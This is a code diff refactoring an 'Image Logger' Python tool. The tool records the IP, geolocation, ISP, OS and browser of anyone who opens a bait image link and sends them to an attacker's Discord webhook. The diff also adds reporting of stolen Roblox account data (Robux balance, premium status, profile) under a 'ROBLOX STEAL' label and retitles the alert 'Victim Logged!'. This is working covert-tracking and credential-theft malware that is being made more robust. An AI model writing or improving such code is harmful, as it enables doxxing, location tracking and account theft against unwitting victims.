@@ -88,24 +88,22 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, roblox_data=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, roblox_data=None):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
     
     if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "",
+            "embeds": [{
+                "title": "Image Logger - Link Sent",
+                "color": config["color"],
+                "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            }]
+        }) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -113,7 +111,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
         if config["vpnCheck"] == 2:
-                return
+            return
         
         if config["vpnCheck"] == 1:
             ping = ""
@@ -126,7 +124,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 return
 
         if config["antiBot"] == 3:
-                return
+            return
 
         if config["antiBot"] == 2:
             if info["proxy"]:
@@ -135,46 +133,59 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 ping = ""
 
         if config["antiBot"] == 1:
-                ping = ""
+            ping = ""
 
+    # SAFE: All early returns done. Now parse & build embed_desc
+    try:
+        os_parsed, browser_parsed = httpagentparser.simple_detect(useragent)
+        os = os_parsed or "Unknown"
+        browser = browser_parsed or "Unknown"
+    except:
+        os = browser = "Unknown"
 
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+    # IP details with .get() defaults
+    isp = info.get('isp', 'Unknown')
+    asn = info.get('as', 'Unknown')
+    country = info.get('country', 'Unknown')
+    region = info.get('regionName', 'Unknown')
+    city = info.get('city', 'Unknown')
+    lat_lon = f"{info.get('lat', 0):.4f}, {info.get('lon', 0):.4f}"
+    timezone = info.get('timezone', 'Unknown')
+    mobile = info.get('mobile', False)
+    proxy_status = info.get('proxy', False)
+    hosting_status = info.get('hosting', False)
+
+    coords_str = coords or lat_lon
+    maps_link = f"[Google Maps](https://www.google.com/maps/search/?api=1&query={coords_str.replace(' ', '+')})"
+    timezone_display = timezone.replace('_', ' ').split('/')[-1] if '/' in timezone else timezone
+    bot_display = 'True' if hosting_status and not proxy_status else 'Possibly' if hosting_status else 'False'
+
+    # NOW define embed_desc - bulletproof
+    embed_desc = f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-            
+
 **IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **IP:** `{ip}`
+> **Provider:** `{isp}`
+> **ASN:** `{asn}`
+> **Country:** `{country}`
+> **Region:** `{region}`
+> **City:** `{city}`
+> **Coords:** `{coords_str}` ({maps_link})
+> **Timezone:** `{timezone_display}`
+> **Mobile:** `{mobile}`
+> **VPN/Proxy:** `{proxy_status}`
+> **Hosting/Bot:** `{bot_display}`
 
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
 **User Agent:**
-```
+
 {useragent}
 ```""",
-    }
-  ],
-}
     
     if roblox_data:
         embed_desc += f"""
@@ -185,21 +196,26 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Robux:** `{roblox_data['robux']:,}`
 > **Premium:** `{'Yes' if roblox_data['premium'] else 'No'}`
 > [Profile](https://www.roblox.com/users/{roblox_data['user_id']}/profile) | [Avatar]({roblox_data['avatar']})"""
-    
-    embed = {
+
+    # Build & send embed
+    embed_payload = {
         "username": config["username"],
         "content": ping + (" 🟥 ROBLOX STEAL" if roblox_data else ""),
         "embeds": [{
-            "title": "🟥 ROBLOX + Image Logger Hit!" if roblox_data else "Image Logger - IP Logged",
+            "title": "🟥 ROBLOX + Image Logger Hit!" if roblox_data else "Image Logger - Victim Logged!",
             "color": 0xFF0000 if roblox_data else config["color"],
             "description": embed_desc,
+            "timestamp": requests.get("https://worldtimeapi.org/api/timezone/UTC", timeout=3).json().get("utc_datetime", "")
         }]
     }
-    
-    if url: 
-        embed["embeds"][0]["thumbnail"] = {"url": url}
-    if roblox_data:
-        embed["embeds"][0]["thumbnail"] = {"url": roblox_data['avatar']}
+
+    if url:
+        embed_payload["embeds"][0]["thumbnail"] = {"url": url}
+    elif roblox_data:
+        embed_payload["embeds"][0]["thumbnail"] = {"url": roblox_data['avatar']}
+
+    requests.post(config["webhook"], json=embed_payload)
+    return info  # Your original return
     
 
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
